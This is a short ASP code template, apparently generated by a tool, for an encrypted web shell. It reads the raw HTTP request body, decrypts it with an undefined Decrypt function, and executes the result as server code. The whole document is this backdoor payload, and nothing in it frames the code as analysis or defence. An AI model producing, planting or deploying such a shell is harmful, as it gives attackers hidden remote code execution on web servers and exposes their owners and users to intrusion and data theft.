<%%
Response.CharSet = "UTF-8"
%s

size=Request.TotalBytes
content=Request.BinaryRead(size)
execute(Decrypt(content))
%%>